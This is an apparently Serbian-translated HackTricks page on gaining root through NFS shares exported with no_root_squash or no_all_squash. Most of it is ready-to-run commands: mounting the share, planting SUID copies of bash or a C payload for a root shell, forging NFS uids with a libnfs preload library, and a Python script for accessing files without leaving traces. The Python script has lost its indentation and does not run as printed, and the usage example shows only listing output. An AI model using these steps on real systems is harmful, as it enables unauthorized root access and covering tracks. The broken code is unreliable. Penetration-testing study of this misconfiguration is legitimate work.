# NFS no\_root\_squash/no\_all\_squash misconfiguration PE

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Pročitajte datoteku \_ **/etc/exports** \_, ako pronađete neki direktorijum koji je konfigurisan kao **no\_root\_squash**, tada ga možete **pristupiti** kao **klijent** i **pisati unutar** tog direktorijuma **kao** da ste lokalni **root** mašine.

**no\_root\_squash**: Ova opcija omogućava korisniku root na klijentu da pristupa datotekama na NFS serveru kao root. Ovo može dovesti do ozbiljnih sigurnosnih posledica.

**no\_all\_squash:** Ovo je slična opcija kao **no\_root\_squash**, ali se odnosi na **non-root korisnike**. Zamislite, imate shell kao nobody korisnik; proverite datoteku /etc/exports; opcija no\_all\_squash je prisutna; proverite datoteku /etc/passwd; emulirajte non-root korisnika; kreirajte suid datoteku kao taj korisnik (montiranjem pomoću nfs). Izvršite suid kao nobody korisnik i postanite drugi korisnik.

## Eskalacija privilegija

### Udaljeni napad

Ako ste pronašli ovu ranjivost, možete je iskoristiti:

* **Montiranjem tog direktorijuma** na klijentskoj mašini, i **kao root kopiranjem** unutar montiranog foldera **/bin/bash** binarnu datoteku i davanje **SUID** prava, i **izvršavanje sa žrtvene** mašine te bash binarne datoteke.

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

* **Montiranje tog direktorijuma** na klijentskom računaru, i **kopiranje kao root** unutar montiranog foldera našeg kompajliranog payloada koji će zloupotrebiti SUID dozvole, dati mu **SUID** prava, i **izvršiti sa žrtvinog** računara tu binarnu datoteku (ovde možete pronaći neke [C SUID payloade](payloads-to-execute.md#c)).

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Lokalni eksploit

{% hint style="info" %}
Imajte na umu da ako možete da napravite **tunel sa vašeg računara do računara žrtve, i dalje možete koristiti udaljenu verziju za iskorišćavanje ovog eskalacije privilegija tuneliranjem potrebnih portova**.\
Sledeći trik je u slučaju da datoteka `/etc/exports` **ukazuje na IP adresu**. U ovom slučaju, nećete moći da koristite **udaljeni eksploit** i moraćete da **zloupotrebite ovaj trik**.\
Još jedan neophodan uslov za iskorišćavanje eksploita je da **izvoz unutar `/etc/export`** **mora koristiti `insecure` zastavicu**.\
\--_Nisam siguran da li će ovaj trik raditi ako `/etc/export` ukazuje na IP adresu_--
{% endhint %}

### Osnovne informacije

Scenario uključuje iskorišćavanje montiranog NFS deljenog resursa na lokalnom računaru, iskorišćavanjem greške u NFSv3 specifikaciji koja omogućava klijentu da specificira svoj uid/gid, potencijalno omogućavajući neovlašćeni pristup. Iskorišćavanje uključuje korišćenje [libnfs](https://github.com/sahlberg/libnfs), biblioteke koja omogućava falsifikovanje NFS RPC poziva.

#### Kompilacija biblioteke

Koraci kompilacije biblioteke mogu zahtevati prilagođavanje na osnovu verzije jezgra. U ovom konkretnom slučaju, fallocate syscalls su bili zakomentarisani. Proces kompilacije uključuje sledeće komande:

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Izvođenje napada

Napad uključuje kreiranje jednostavnog C programa (`pwn.c`) koji povećava privilegije na root i zatim izvršava shell. Program se kompajlira, a rezultirajući binarni fajl (`a.out`) se postavlja na deljeni folder sa suid root, koristeći `ld_nfs.so` da bi se lažirao uid u RPC pozivima:

1. **Kompajlirajte kod napada:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Postavite napad na deljeni folder i izmenite dozvole lažiranjem uid-a:**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Izvršite napad da biste dobili privilegije root-a:**

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell za neprimetan pristup fajlovima

Kada se dobije pristup kao root, za interakciju sa NFS deljenim folderom bez menjanja vlasništva (kako bi se izbegli tragovi), koristi se Python skripta (nfsh.py). Ova skripta prilagođava uid da odgovara uid-u fajla koji se pristupa, omogućavajući interakciju sa fajlovima na deljenom folderu bez problema sa dozvolama:

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Pokrenite kao:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

### Reference

* [https://www.errno.fr/nfs\_privesc.html](https://www.errno.fr/nfs\_privesc.html)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
